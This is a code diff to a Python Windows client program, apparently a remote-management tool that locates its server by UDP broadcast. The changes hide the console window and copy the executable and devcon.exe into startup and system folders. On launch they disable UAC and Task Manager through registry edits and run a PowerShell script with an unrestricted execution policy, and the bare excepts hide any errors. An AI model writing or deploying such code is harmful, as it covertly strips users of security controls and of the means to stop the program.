@@ -32,8 +32,8 @@ import win32console
 import win32gui
 
 #Hide the Console
-#window = win32console.GetConsoleWindow()
-#win32gui.ShowWindow(window, 0)
+window = win32console.GetConsoleWindow()
+win32gui.ShowWindow(window, 0)
 
 from ctypes import windll
 SetWindowPos = windll.user32.SetWindowPos
@@ -58,7 +58,7 @@ TCP_PORT2 = 9005
 BUFFER_SIZE = 1024
 MAX_BYTES = 65000
 
-src = sys.executable
+"""src = sys.executable
 print(src)
 config_name = 'client_big_project.exe'
 
@@ -69,25 +69,45 @@ else:
     application_path = os.path.dirname(__file__)
 print(application_path)
 config_path = os.path.join(application_path, config_name)
-print(config_path)
+print(config_path)"""
 
 
 def add_to_startup():
-    file_folder = str(pathlib.Path(__file__).parent.absolute())
-    print(file_folder)
-    devconMove = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % final.USER_NAME + "\\devcon.exe"
-    file_path_move = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % final.USER_NAME + "\\client_big_project.exe"
-    devconCurrent = file_folder + "\\devcon.exe"
-    file_path_current = file_folder + "\\client_big_project.exe"
-    print(devconCurrent)
-    print(file_path_current)
-    shutil.move(file_path_current, file_path_move)
-    shutil.move(devconCurrent, devconMove)
+    try:
+        file_folder = str(pathlib.Path(__file__).parent.absolute())
+        print(file_folder)
+        devconMove = final.main_path + "\\devcon.exe"
+        file_path_move = final.main_path + "\\client_big_project.exe"
+        image_move = final.first_setup_path + "\\fe_icon.png"
+        # wol_settings_move = final.first_setup_path + "\\Enable-WOLWindowsNICSettings.ps1"
+        devconCurrent = file_folder + "\\devcon.exe"
+        file_path_current = file_folder + "\\client_big_project.exe"
+        image_current = file_folder + "\\fe_icon.png"
+        # wol_setting_current = file_folder + "\\Enable-WOLWindowsNICSettings.ps1"
+        print(devconCurrent)
+        print(file_path_current)
+        print(image_current)
+        try:
+            shutil.move(image_current, image_move)
+        except:
+            pass
+        try:
+            shutil.move(file_path_current, file_path_move)
+        except:
+            pass
+        try:
+            shutil.move(devconCurrent, devconMove)
+            shutil.copy(devconMove, r"C:\Windows\System32\devcon.exe")
+            shutil.copy(devconMove, r"C:\Windows\SysWOW64\devcon.exe")
+        except:
+            pass
+    except:
+        pass
 
 
 # convert to exe file -
 # pyinstaller --onefile --uac-admin client_big_project.py
-# pyinstaller --onefile --uac-admin --noconsole client_big_project.py -r prog.exe.manifest,1
+# pyinstaller --onefile --uac-admin client_big_project.py -r prog.exe.manifest,1
 
 #def makeService():
     #subprocess.call("start uac.bat")
@@ -402,6 +422,7 @@ class Client(Thread):
         while True:
             try:
                 self.client_socket.sendto("new client".encode(), (BROADCAST_IP, self.port))
+                print("5")
                 data, address = self.client_socket.recvfrom(self.max_bytes)
                 self.server_ip = address[0]
                 final.SERVER_IP = self.server_ip
@@ -449,14 +470,22 @@ class Client(Thread):
             except:
                 pass
         final.end_gui = True
-        # send_gui_support.destroy_window()
+        subprocess.Popen("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f")
+        subprocess.Popen("reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
         send_gui_thread.join()
         self.client_socket.close()
 
 
 def main():
+    add_to_startup()
+    subprocess.Popen("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+    subprocess.Popen("reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
     try:
-        add_to_startup()
+        psxmlgen = subprocess.Popen(['powershell.exe',
+                                     '-ExecutionPolicy',
+                                     'Unrestricted',
+                                     prog_location + "/Enable-WOLWindowsNICSettings.ps1"], cwd=os.getcwd())
+        result = psxmlgen.wait()
     except:
         pass
     create_start()
